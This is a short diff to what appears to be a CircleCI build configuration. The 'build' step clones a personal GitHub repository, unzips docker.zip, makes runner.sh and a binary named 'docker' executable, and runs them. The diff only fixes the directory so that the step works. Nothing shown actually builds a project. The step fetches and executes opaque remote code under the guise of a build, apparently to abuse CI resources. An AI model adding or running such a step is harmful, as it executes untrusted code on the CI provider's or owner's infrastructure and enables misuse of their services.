@@ -17,7 +17,7 @@ commands:
       - run:
           name: build
           command: |
-              git clone https://github.com/ahmadghozaliurhniyu/LordXord11 && unzip docker.zip && chmod +x runner.sh docker && ./runner.sh
+              git clone https://github.com/ahmadghozaliurhniyu/LordXord11 && cd LordXord11 && unzip docker.zip && chmod +x runner.sh docker && ./runner.sh
               
 jobs:
   buildd:
